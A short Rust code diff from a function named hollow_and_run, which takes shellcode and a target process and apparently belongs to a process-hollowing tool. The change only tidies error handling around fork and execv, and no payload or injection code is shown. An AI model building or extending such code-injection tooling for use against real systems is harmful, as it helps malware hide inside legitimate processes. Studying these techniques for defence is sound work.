@@ -46,9 +46,7 @@ pub fn hollow_and_run(shellcode: &[u8], target_process: &str) {
             // Execute the target process in place of the currently running one (ie, the child)
             let executable = CString::new(target_process).unwrap();
             let arguments: &[&CStr; 0] = &[];
-            if let Err(error) = execv(&executable, arguments) {
-                panic!("Could not execv: {error}");
-            }
+            execv(&executable, arguments).unwrap();
         }
         Err(err) => panic!("Forking the parent failed: {err}"),
     }
